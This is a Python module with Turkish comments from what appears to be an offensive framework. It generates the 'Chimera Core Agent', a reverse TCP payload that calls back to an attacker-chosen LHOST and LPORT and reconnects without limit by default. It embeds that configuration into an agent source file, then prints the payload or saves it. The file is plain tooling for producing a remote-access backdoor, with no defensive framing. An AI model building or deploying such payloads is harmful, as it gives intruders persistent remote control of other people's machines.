from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import os
import sys

# Builder çekirdek kütüphanesini içe aktarmaya çalış
try:
    from build.chimera_builder import build_payload, print_build_report
    _BUILDER_AVAILABLE = True
except ImportError:
    # Eğer build/ dizini modül kütüphanesi olarak doğrudan import edilemiyorsa,
    # manuel olarak sys.path'e ekleyip deneyelim.
    proot = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
    if proot not in sys.path:
        sys.path.insert(0, proot)
    try:
        from build.chimera_builder import build_payload, print_build_report
        _BUILDER_AVAILABLE = True
    except ImportError:
        _BUILDER_AVAILABLE = False


class Payload(BaseModule):
    """
    Chimera Core Agent - Reverse TCP Payload Generator.
    Gelişmiş Chimera ajanını üretir. Sadece Python 3 standart kütüphaneleri kullanır.
    """
    Name = "Chimera Core Agent"
    Description = "Chimera reverse TCP ajanı. Gelişmiş builder altyapısını kullanır."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Handler)."),
            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir="."),
            "RECONNECT_DELAY": Option("RECONNECT_DELAY", 5, False, "Yeniden bağlanma bekleme süresi (sn)."),
            "MAX_RECONNECT": Option("MAX_RECONNECT", -1, False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
            "STRIP_COMMENTS": Option("STRIP_COMMENTS", False, False, "Yorum satırlarını temizle.", choices=[True, False]),
        }

    def generate(self, quiet=True) -> dict:
        """Chimera agent kodunu okur ve konfigürasyonları gömer.
        
        Returns:
            dict: build_payload() dönüş nesnesi (stats, success, code vb. ile beraber).
        """
        lhost = self.Options["LHOST"].value
        lport = self.Options["LPORT"].value
        output = self.Options["OUTPUT"].value
        reconnect_delay = int(self.Options["RECONNECT_DELAY"].value or 5)
        max_reconnect = int(self.Options["MAX_RECONNECT"].value or -1)
        strip_comments = self.Options["STRIP_COMMENTS"].value

        if isinstance(strip_comments, str):
            strip_comments = strip_comments.lower() in ("true", "1", "yes", "evet")

        agent_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "agent.py"
        )

        if _BUILDER_AVAILABLE:
            result = build_payload(
                lhost=lhost,
                lport=int(lport),
                reconnect_delay=reconnect_delay,
                max_reconnect=max_reconnect,
                output_path=output if output else None,
                agent_source_path=agent_path,
                strip_comments=bool(strip_comments),
                quiet=quiet
            )
            return result
        else:
            return {"success": False, "error": "[!] build.chimera_builder yüklenemedi!", "code": "", "output_path": None, "stats": {}}


    def run(self, options: Dict[str, Any]):
        """Payload oluştur ve ekrana bas veya dosyaya kaydet."""
        
        if not _BUILDER_AVAILABLE:
             print("[!] HATA: build/chimera_builder.py bulunamadı.")
             return None

        result = self.generate(quiet=False)

        if result["success"]:
            # Çıktı raporunu bas
            print_build_report(result)
            
            # Eğer dosyaya yazıldıysa
            if result.get("output_path"):
                print(f"[+] Payload kaydedildi: {result['output_path']}")
                return result["output_path"]
            
            # Eğer dosyaya yazılmadıysa, sadece raw kod dönecektir (fakat çok uzun olacağı için genelde ekrana basılmaz, ama dönmekte fayda var)
            return result["code"]
        else:
            print(result["error"])
            return result["error"]
